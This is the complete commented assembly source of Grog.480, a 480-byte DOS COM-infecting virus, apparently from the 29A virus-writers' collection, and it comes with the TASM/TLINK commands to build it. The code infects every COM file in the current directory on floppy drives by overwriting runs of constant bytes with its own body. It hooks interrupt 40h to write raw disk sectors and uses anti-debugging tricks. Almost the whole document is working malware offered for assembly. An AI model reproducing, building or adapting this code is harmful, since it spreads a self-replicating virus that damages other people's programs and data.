;              'ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿'
;               º ****:::: Disassembly - Grog.480 ::::**** º
;               º ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ º
;               º ********* -= Darkman / 29A =- ********** º
;              'ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ'


; Grog.480 is a 480 bytes parasitic direct action COM virus. Infects every
; file in current directory, if current drive is A: or B:, when executed, by
; searching for an area, the size of the virus, of constant bytes, stores the
; constant byte and overwrites the area with the virus. Grog.480 has anti-
; debugging techniques and is using the address of interrupt 40h (ROM BIOS
; diskette handler relocated by hard disk BIOS) handler- and
; interrupt 40h (ROM BIOS diskette handler relocated by hard disk BIOS) DOS
; exploit.

; To compile Grog.480 with Turbo Assembler v 4.0 type:
;   TASM /M GROG_480.ASM
;   TLINK /t /x GROG_480.OBJ


.model tiny
.code
 org   100h				 ; Origin of Grog.480

code_begin:
	     call    virus_begin
virus_begin:
const_byte   equ     $-01h		 ; Constant byte

	     db      0cdh,03h		 ; INT 03h

	     inc     di 		 ; Increase DI
	     mov     ax,20cdh		 ; INT 20h (opcode 0cdh,20h)
	     inc     di 		 ; Increase DI

	     pop     bp 		 ; Load BP from stack
	     mov     bp,[bp-02h]	 ; BP = delta offset

	     lea     si,[bp+origin_code] ; SI = offset of origin_code
	     mov     di,100h		 ; DI = beginning of code
	     movsb			 ; Move original code to beginning
	     movsw			 ;  "      "      "   "      "

	     mov     ah,19h		 ; Get current default drive
	     int     21h
	     cmp     al,01h		 ; Current default drive equal to B:?
	     ja      move_restore	 ; Above? Jump to move_restore

	     lea     dx,[bp+int40_virus] ; DX = offset of int40_virus
	     mov     ax,2540h		 ; Set interrupt vector 40h
	     int     21h

	     lea     dx,dta		 ; DX = offset of dta
	     mov     ah,1ah		 ; Set disk transfer area address
	     int     21h

	     lea     dx,[bp+file_specifi]
	     mov     ah,4eh		 ; Find first matching file
find_next:
	     int     21h
	     jc      virus_exit 	 ; Error? Jump to virus_exit

	     call    infect_file

	     mov     ah,3eh		 ; Close file
	     int     21h

	     mov     ah,4fh		 ; Find next matching file

	     jmp     find_next
virus_exit:
	     mov     dx,80h		 ; DX = default disk transfer area
	     mov     ah,1ah		 ; Set disk transfer area address
	     int     21h

	     mov     dx,0f000h		 ; DX = segment of interrupt 40h
	     mov     ds,dx		 ; DS =    "    "      "      "
	     mov     dx,0ec59h		 ; DX = offset of interrupt 40h
	     mov     ax,2540h		 ; Set interrupt vector 40h
	     int     21h

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS from stack (CS)
move_restore:
	     lea     si,[bp+restore]	 ; SI = offset of restore
	     lea     di,destination	 ; DI = offset of destination
	     push    di 		 ; Save DI at stack
	     mov     cx,(restore_end-restore)
	     rep     movsb		 ; Move restore code to destination

	     ret			 ; Return!

restore      proc    near		 ; Restore the original program
	     lea     di,[bp+const_byte]  ; DI = offset of const_byte
	     mov     al,[di]		 ; AL = constant byte
	     mov     cx,(code_end-const_byte)
	     rep     stosb		 ; Restore the original program

	     xor     ax,ax		 ; Zero AX
	     xor     bx,bx		 ; Zero BX
	     mov     dx,cs		 ; DX = code segment
	     mov     si,100h		 ; SI = offset of beginning of code
	     mov     di,si		 ; DI =   "    "      "     "   "
	     mov     bp,sp

	     push    si 		 ; Save SI at stack
ret_to_close:
	     ret			 ; Return!
restore_end:
	     endp

	     db      'HopHopHop (c) ''93 By GROG - Italy'
origin_code  db      0cdh,20h,? 	 ; Original code of infected COM file
file_specifi db      '*.COM',00h         ; File specification

infect_file  proc    near		 ; Infect COM file
	     mov     ax,3d00h		 ; Open file (read)
	     lea     dx,filename	 ; DX = offset of filename
	     int     21h
	     xchg    ax,bx		 ; BX = file handle

	     lea     dx,infect_code	 ; DX = offset of infect_code
	     call    read_file
	     cmp     [infect_code],0e8h  ; CALL imm16 (opcode e8h)?
	     je      ret_to_close	 ; Already infected? Jump to ret_to_..

	     lea     si,cylinder	 ; SI = offset of cylinder
	     lea     di,infect_cylin	 ; DI = offset of infect_cylin
	     movsw			 ; Move cylinder, sector, head and ...
	     movsw			 ;  "       "        "     "    "   "

	     lea     si,infect_code	 ; SI = offset of infect_code
	     lea     di,[bp+origin_code] ; DI = offset of origin_code
	     movsb			 ; Move original code to origin_code
	     movsw			 ;  "      "      "   "       "

	     xor     di,di		 ; Zero DI
read_buffer:
	     lea     dx,file_buffer	 ; DX = offset of file_buffer
	     call    read_file

	     mov     cx,200h		 ; Search through five-hundred and ...
	     add     di,cx		 ; Add size of file_buffer

	     lea     si,file_buffer	 ; SI = offset of file_buffer
	     mov     ah,[si]		 ; AH = first byte of file_buffer
	     inc     ah 		 ; Increase AH
search_const:
	     lodsb			 ; Load a byte of file_buffer
	     cmp     al,ah		 ; Equal to constant byte?
	     mov     ah,al		 ; AH = constant byte
	     je      test_counter	 ; Equal? Jump to test_counter

	     mov     dx,-01h
test_counter:
	     inc     dx 		 ; Increase DX
	     cmp     dx,(code_end-virus_begin+01h)
	     je      found_const	 ; Equal? Jump to found_const

	     loop    search_const

	     jmp     read_buffer
found_const:
	     push    di 		 ; Save DI at stack

	     mov     di,si		 ; SI = offset of cave + 01h
	     dec     di 		 ; DI = offset of cave
	     sub     di,(code_end-virus_begin)
	     lea     si,[bp+virus_begin] ; SI = offset of virus_begin
	     mov     cx,(code_end-virus_begin)
	     rep     movsb		 ; Move virus to cave

	     mov     ax,301h		 ; Write disk sector
	     lea     bx,file_buffer	 ; BX = offset of file_buffer
	     mov     cx,[cylinder]	 ; CX = cylinder and sector number
	     mov     dx,[head]		 ; DX = head and drive number
	     call    write_file

	     mov     [infect_code],0e8h  ; Store CALL imm16

	     pop     ax 		 ; Load AX from stack (DI)

	     dec     ax 		 ; Decrease AX
	     dec     ax 		 ; Decrease AX
	     mov     word ptr [infect_code+01h],ax

	     mov     ax,301h		 ; Write disk sector
	     lea     bx,infect_code	 ; BX = offset of infect_code
	     mov     cx,[infect_cylin]	 ; CX = cylinder and sector number
	     mov     dx,[infect_head]	 ; DX = head and drive number
	     call    write_file

	     ret			 ; Return!
	     endp

	     db      0dh,0ah,'"Guida alla Corsa"',0dh,0ah
	     db      0dh,0ah,'Capitolo primo',0dh,0ah
	     db      0dh,0ah,'Come correre al modo dei conigli.',0dh,0ah
	     db      0dh,0ah,'Hop Hop Hop',0dh,0ah
	     db      'Hop Hop Hop',0dh,0ah

read_file    proc    near		 ; Read from file
	     mov     ah,3fh		 ; Read from file
	     mov     cx,200h		 ; Read five-hundred and twelve bytes
	     int     21h
	     cmp     ax,200h		 ; Read five-hundred and twelve bytes?
	     je      correct_read	 ; Equal? Jump to correct_read

	     inc     sp 		 ; Increase SP
	     inc     sp 		 ; Increase SP
correct_read:
	     ret			 ; Return!
	     endp

int40_virus  proc    near		 ; Interrupt 40h of Grog.480
	     mov     cs:[cylinder],cx	 ; Store cylinder and sector number
	     mov     cs:[head],dx	 ; Store head and drive number

	     db      0eah		 ; JMP imm32 (opcode 0eah)
	     dd      0f000ec59h 	 ; Address of interrupt 40h
	     endp

write_file   proc    near		 ; Write to file
	     push    ax bx cx dx	 ; Save registers at stack

	     xor     si,si		 ; Zero SI
write_sector:
	     pop     dx cx bx ax	 ; Load registers from stack

	     push    ax bx cx dx	 ; Save registers at stack

	     pushf			 ; Save flags at stack

	     db      9ah		 ; CALL imm32 (opcode 09ah)
	     dd      0f000ec59h 	 ; Address of interrupt 40h

	     jnc     write_error	 ; Error? Jump to write_error

	     inc     si 		 ; Increase SI
	     cmp     si,04h		 ; Write disk sector again?
	     jne     write_sector	 ; Not equal? Jump to write_sector
write_error:
	     pop     dx cx bx ax	 ; Load registers from stack

	     ret			 ; Return!
	     endp
code_end:
	     db      0e37dh dup(?)
infect_code  db      200h dup(?)	 ; CALL imm16 (opcode 0e8h)
file_buffer  db      200h dup(?)	 ; File buffer
destination:
	     db      03h dup(?)
cylinder     dw      ?			 ; Cylinder and sector number
head	     dw      ?			 ; Head and drive number
infect_cylin dw      ?			 ; Cylinder and sector number
infect_head  dw      ?			 ; Head and drive number
dta:
	     db      15h dup(?) 	 ; Used by DOS for find next-process
file_attr    db      ?			 ; File attribute
file_time    dw      ?			 ; File time
file_date    dw      ?			 ; File date
filesize     dd      ?			 ; Filesize
filename     db      0dh dup(?) 	 ; Filename
data_end:

end	     code_begin

